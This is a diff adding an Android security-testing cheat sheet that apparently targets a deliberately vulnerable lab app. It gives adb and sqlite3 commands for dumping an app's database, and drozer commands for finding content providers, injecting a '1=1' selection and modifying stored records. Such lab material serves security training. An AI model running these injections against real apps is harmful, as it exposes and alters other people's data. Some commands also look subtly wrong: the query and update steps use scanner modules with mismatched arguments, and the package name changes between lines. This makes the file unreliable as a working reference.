@@ -1,0 +1,49 @@
+#Opening a database using sqlite3
+
+adb shell
+sqlite3 [path to the database].db
+
+#All the currently open databases
+sqlite3> .databases
+
+#All the tables in the loaded database
+sqlite3> .tables
+
+#Viewing the Schema
+sqlite3> .schema
+
+#Getting information about a particular table
+sqlite3> pragma table_info([table-name]);
+
+Returning all data in a particular table
+sqlite3> select * from [table-name];
+eg : SELECT * from USER_RECORDS;
+
+#To improve the output formatting
+For column view:
+sqlite3> .mode column 
+To show headers:
+sqlite3> .headers on
+
+#To dump the entire database and all operations performed on it so far
+sqlite3> .dump
+
+#Using SQLite3 from outside adb shell
+
+adb shell sqlite3 -column -header /data/data/com.attify.sqliteapp/databases/vulnerable-db 'select * from USER_RECORDS'
+
+#Connecting to drozer
+adb forward tcp:31415 tcp:31415
+drozer console connect
+
+#Running drozer's scanner module to find vulnerability
+dz> run scanner.provider.finduris -a com.attify.vulnsqliteapp
+
+#Running drozer's injection module
+dz> run scanner.provider.injection -a com.attify.vulnsqliteapp
+
+#Using drozer to perform SQLite injection
+dz> run scanner.provider.query [content provider URI] --selection "1=1"
+
+#Updating information in database using drozer
+dz> run scanner.provider.injection -a com.attify.vulnsqliteapp _id 2 --string category urgent --string summary “Financial Summary” --string description “Submit Annual Report”
